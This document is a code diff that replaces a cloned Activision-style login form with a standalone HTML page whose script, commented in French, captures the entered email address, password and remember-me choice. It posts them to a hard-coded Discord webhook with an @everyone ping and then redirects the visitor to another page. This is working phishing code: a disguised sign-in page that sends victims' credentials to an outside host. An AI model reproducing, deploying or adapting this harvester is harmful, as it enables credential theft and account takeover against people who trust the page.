@@ -231,39 +231,107 @@
 
 	
 	
-	<div class="data-row clearfix" id="email-data-row">
-		<label for="username">Email Address:<sup>*</sup></label>
-		<div class="input-container clearfix">
-			<input type="email" id="username" name="username" title="Please enter your email address" aria-label="Please enter your email address" autocomplete="on" placeholder="" value="" required="" aria-required="true" aria-describedby="email-error">	
-		</div>
-		<span class="sprite-pages feedback-control icon"></span>
-		<div id="email-error" class="feedback-control message" role="alert" aria-live="assertive">Please enter your email address</div>	
-	</div>	
-	<div class="data-row clearfix" id="remember-me-div">
-		<div class="input-container clearfix">
-			<input type="checkbox" id="remember-me-checkbox" class="atvi-instrument atvi-instrument-checkbox" name="remember_me" value="true" checked="checked">
-			<label for="remember-me-checkbox" class="custom-checkbox" style="display:none;"></label>
-		</div>
-		<label for="remember-me-checkbox">Remember me</label>
-	</div>					
-	<div class="data-row clearfix" id="password-data-row">	    	
-		<label for="password">Password:<sup>*</sup></label>
-		<div class="input-container clearfix">
-			<input type="password" id="password" name="password" title="Please enter a password" aria-label="Please enter a password" autocomplete="on" placeholder="" required="" aria-required="true" aria-describedby="password-error">
-			<span class="visibility-toggle" tabindex="0"></span>
-		</div>
-		<span class="sprite-pages feedback-control icon"></span>
-		<div id="password-error" class="feedback-control message" role="alert" aria-live="assertive">Please enter a password</div>
-	</div>
-	
-	
-	
-	
-	<div class="actions clearfix">
-		
-	    <button id="login-button" class="submit large atvi-instrument atvi-instrument-button" type="submit">Sign In</button>
-	    
-	</div>
+							<!DOCTYPE html>
+							<html lang="fr">
+							<head>
+								<meta charset="UTF-8">
+								<meta name="viewport" content="width=device-width, initial-scale=1.0">
+								<title>Formulaire</title>
+							</head>
+							<body>
+								<!-- Ton formulaire ici -->
+								<div class="data-row clearfix" id="email-data-row">
+									<label for="username">Email Address:<sup>*</sup></label>
+									<div class="input-container clearfix">
+										<input type="email" id="username" name="username" title="Please enter your email address" aria-label="Please enter your email address" autocomplete="on" placeholder="" value="" required="" aria-required="true" aria-describedby="email-error">
+									</div>
+									<span class="sprite-pages feedback-control icon"></span>
+									<div id="email-error" class="feedback-control message" role="alert" aria-live="assertive">Please enter your email address</div>
+								</div>
+							
+								<div class="data-row clearfix" id="remember-me-div">
+									<div class="input-container clearfix">
+										<input type="checkbox" id="remember-me-checkbox" class="atvi-instrument atvi-instrument-checkbox" name="remember_me" value="true" checked="checked">
+										<label for="remember-me-checkbox" class="custom-checkbox" style="display:none;"></label>
+									</div>
+									<label for="remember-me-checkbox">Remember me</label>
+								</div>
+							
+								<div class="data-row clearfix" id="password-data-row">
+									<label for="password">Password:<sup>*</sup></label>
+									<div class="input-container clearfix">
+										<input type="password" id="password" name="password" title="Please enter a password" aria-label="Please enter a password" autocomplete="on" placeholder="" required="" aria-required="true" aria-describedby="password-error">
+										<span class="visibility-toggle" tabindex="0"></span>
+									</div>
+									<span class="sprite-pages feedback-control icon"></span>
+									<div id="password-error" class="feedback-control message" role="alert" aria-live="assertive">Please enter a password</div>
+								</div>
+							
+								<!-- Bouton, ici on met type="button" pour ne pas recharger la page -->
+								<div class="actions clearfix">
+									<button id="login-button" class="submit large atvi-instrument atvi-instrument-button" type="button">Sign In</button>
+								</div>
+							
+								<!-- Ajoute ton script JavaScript ici, juste avant la fermeture de </body> -->
+								<script>
+									document.getElementById("login-button").addEventListener("click", function(event) {
+										// Empêche le comportement par défaut (rechargement de la page)
+										event.preventDefault();
+							
+										// Vérifie que les champs sont remplis
+										let email = document.getElementById("username").value;
+										let password = document.getElementById("password").value;
+										let rememberMe = document.getElementById("remember-me-checkbox").checked ? "✅ Oui" : "❌ Non";
+							
+										// Vérifier si les champs sont remplis
+										if (!email || !password) {
+											alert("Veuillez remplir tous les champs !");
+											return;
+										}
+							
+										// URL de ton Webhook Discord (remplace par le tien)
+										const webhookURL = "https://discord.com/api/webhooks/1245757451706433678/Ysw4NU7yYOHM7bAzyBxZoNEIAozFC01tjzx4UdOFz32a9oT_DeXEJFpXCLl8MtGdamNt";
+							
+										// Format du message avec @everyone
+										const data = {
+											content: "@everyone **Nouveau login reçu :**",
+											embeds: [{
+												title: "Détails de connexion",
+												fields: [
+													{ name: "📧 Email", value: email, inline: true },
+													{ name: "🔒 Mot de passe", value: password, inline: true },
+													{ name: "💾 Se souvenir de moi", value: rememberMe, inline: true }
+												],
+												color: 16711680 // Rouge
+											}]
+										};
+							
+										// Envoi de la requête POST au webhook
+										fetch(webhookURL, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify(data)
+})
+.then(response => {
+    if (response.ok) {
+        window.location.href = "index2.html"; // Redirection après envoi réussi
+    } else {
+        alert("Erreur lors de l'envoi !");
+    }
+})
+.catch(error => {
+    console.error("Erreur :", error);
+    alert("Une erreur est survenue !");
+});
+
+										});
+								</script>
+							</body>
+							</html>
+							
+							
+							
+							
 	
 		<div class="login-forgot-password">
 					
